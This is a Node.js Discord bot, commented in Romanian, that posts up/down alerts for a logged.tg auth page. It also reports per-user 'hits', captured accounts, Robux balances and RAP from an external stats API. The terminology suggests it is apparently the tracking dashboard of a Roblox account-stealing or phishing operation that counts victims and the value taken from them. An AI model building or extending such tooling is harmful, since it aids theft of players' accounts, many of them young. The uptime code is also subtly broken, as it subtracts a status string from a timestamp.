// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

// 2️⃣ Server Express pentru keep-alive
const app = express();
const PORT = process.env.PORT || 3000;
app.get("/", (req, res) => res.send("Bot is alive ✅"));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// 3️⃣ Creezi clientul Discord
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds, 
    GatewayIntentBits.GuildMessages, 
    GatewayIntentBits.MessageContent
  ] 
});

const TOKEN = process.env.DISCORD_BOT_TOKEN;

// 4️⃣ Config embed + site
const ANNOUNCE_CHANNEL_ID = "1432904664826908724";
const SITE_URL = "https://www.logged.tg/auth/arceusgenn";
const TOP_BANNER = "https://cdn.discordapp.com/attachments/1436416072252260362/1436418034352001124/standard-3.gif";
const BOTTOM_BANNER = "https://cdn.discordapp.com/attachments/1436416072252260362/1436417921894060072/standard-4.gif";
const THUMBNAIL_EMOJI = "https://cdn.discordapp.com/emojis/1435132470742749266.png";

let lastStatus = null;

// 5️⃣ Functii utile
function formatNumber(num) {
  try { return num.toLocaleString(); } catch { return "0"; }
}
function formatDuration(ms) {
  let sec = Math.floor(ms/1000);
  let min = Math.floor(sec/60);
  let hr = Math.floor(min/60);
  sec%=60; min%=60;
  return `${hr}h ${min}m ${sec}s`;
}

// 6️⃣ Functie check site si announce
async function checkSite() {
  const start = Date.now();
  let res, ping;
  try {
    const response = await fetch(SITE_URL);
    res = { ok: response.ok };
    ping = Date.now() - start;
  } catch {
    res = { ok: false };
    ping = null;
  }

  const currentStatus = res.ok ? "UP" : "DOWN";

  if (currentStatus !== lastStatus) {
    const channel = client.channels.cache.get(ANNOUNCE_CHANNEL_ID);
    if (!channel) return console.error("Channel not found!");

    const embed = new EmbedBuilder()
      .setColor(currentStatus === "UP" ? 0x00FF00 : 0xFF0000)
      .setThumbnail(THUMBNAIL_EMOJI)
      .setDescription(`
${TOP_BANNER}

<a:Black_hear:1435093893061541920> **SITE STATUS**

<a:blackverified:1435093657010176071> **STATUS:** ${currentStatus === "UP" ? "ONLINE ✅" : "OFFLINE ❌"}
<a:blackverified:1435093657010176071> Response Time: ${ping ? ping + "ms" : "N/A"}

${BOTTOM_BANNER}
`)
    await channel.send({ content: "@everyone", embeds: [embed] });
    lastStatus = currentStatus;
  }
}

// Check site la fiecare 30 sec
setInterval(checkSite, 30000);

// 7️⃣ Event ready
client.once('ready', () => {
  console.log(`✅ Bot ready as ${client.user.tag}`);
  console.log(`📊 Monitoring site: ${SITE_URL}`);
  checkSite(); // check initial la start
});

// 8️⃣ Event listener comenzi
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();

      if (!data.success || !data.Normal) {
        message.reply("❌ No stats found for this user.");
        return;
      }

      const normal = data.Normal;
      const profile = data.Profile || {};
      const hits = normal.Totals?.Accounts || 0;
      const visits = normal.Totals?.Visits || 0;
      const clicks = normal.Totals?.Clicks || 0;
      const biggestSummary = normal.Highest?.Summary || 0;
      const biggestRap = normal.Highest?.Rap || 0;
      const biggestRobux = normal.Highest?.Balance || 0;
      const totalSummary = normal.Totals?.Summary || 0;
      const totalRap = normal.Totals?.Rap || 0;
      const totalRobux = normal.Totals?.Balance || 0;
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x000000)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`─── <a:Black_hear:1435093893061541920> **NORMAL INFO** <a:Black_hear:1435093893061541920> ───

<a:blackverified:1435093657010176071> **User:** **${userName}**

<a:blackverified:1435093657010176071> **TOTAL STATS:**
\`\`\`
Hits:     ${formatNumber(hits)}
Visits:   ${formatNumber(visits)}
Clicks:   ${formatNumber(clicks)}
\`\`\`

<a:blackverified:1435093657010176071> **BIGGEST HIT:**
\`\`\`
Summary:  ${formatNumber(biggestSummary)}
RAP:      ${formatNumber(biggestRap)}
Robux:    ${formatNumber(biggestRobux)}
\`\`\`

<a:blackverified:1435093657010176071> **TOTAL HIT STATS:**
\`\`\`
Summary:  ${formatNumber(totalSummary)}
RAP:      ${formatNumber(totalRap)}
Robux:    ${formatNumber(totalRobux)}
\`\`\``)
        .setImage(TOP_BANNER)
        .setFooter({ text: "Stats Bot" });

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error(err);
      message.reply("❌ Error fetching stats.");
    }
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${targetId}`);
      const data = await res.json();
      if (!data.success) { message.reply("❌ No stats found."); return; }

      const daily = data.Daily || data.Normal;
      const profile = data.Profile || {};
      if (!daily) { message.reply("❌ No daily stats."); return; }

      const hits = daily.Totals?.Accounts || 0;
      const visits = daily.Totals?.Visits || 0;
      const clicks = daily.Totals?.Clicks || 0;
      const biggestSummary = daily.Highest?.Summary || 0;
      const biggestRap = daily.Highest?.Rap || 0;
      const biggestRobux = daily.Highest?.Balance || 0;
      const totalSummary = daily.Totals?.Summary || 0;
      const totalRap = daily.Totals?.Rap || 0;
      const totalRobux = daily.Totals?.Balance || 0;
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0x000000)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`─── <a:Black_hear:1435093893061541920> **DAILY STATS** <a:Black_hear:1435093893061541920> ───

<a:blackverified:1435093657010176071> **User:** **${userName}**

<a:blackverified:1435093657010176071> **DAILY STATS:**
\`\`\`
Hits:     ${formatNumber(hits)}
Visits:   ${formatNumber(visits)}
Clicks:   ${formatNumber(clicks)}
\`\`\`

<a:blackverified:1435093657010176071> **BIGGEST HIT:**
\`\`\`
Summary:  ${formatNumber(biggestSummary)}
RAP:      ${formatNumber(biggestRap)}
Robux:    ${formatNumber(biggestRobux)}
\`\`\`

<a:blackverified:1435093657010176071> **DAILY HIT STATS:**
\`\`\`
Summary:  ${formatNumber(totalSummary)}
RAP:      ${formatNumber(totalRap)}
Robux:    ${formatNumber(totalRobux)}
\`\`\``)
        .setImage(TOP_BANNER)
        .setFooter({ text: "Stats Bot Daily" });

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error(err);
      message.reply("❌ Error fetching daily stats.");
    }
  }

  // ===== !check =====
  if (message.content.startsWith('!check')) {
    const start = Date.now();
    let res, ping;
    try { 
      const response = await fetch(SITE_URL);
      res = { ok: response.ok };
      ping = Date.now() - start;
    } catch { res = { ok: false }; ping = null; }

    const statusText = res.ok ? "ONLINE ✅" : "OFFLINE ❌";
    const uptimeText = res.ok && lastStatus ? `UP for **${formatDuration(Date.now() - lastStatus)}**` : "No uptime data";

    const embed = new EmbedBuilder()
      .setColor(res.ok ? 0x00FF00 : 0xFF0000)
      .setThumbnail(THUMBNAIL_EMOJI)
      .setDescription(`
${TOP_BANNER}

<a:Black_hear:1435093893061541920> **SITE STATUS**

<a:blackverified:1435093657010176071> **STATUS:** ${statusText}
<a:blackverified:1435093657010176071> **UPTIME:** ${uptimeText}
<a:blackverified:1435093657010176071> Response Time: ${ping ? ping + "ms" : "N/A"}

${BOTTOM_BANNER}
`)
      .setFooter({ text: "Site Uptime Monitor" });

    await message.channel.send({ embeds: [embed] });
  }

});

// 9️⃣ Error handler
client.on('error', console.error);

// 10️⃣ Login
if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }
client.login(TOKEN);
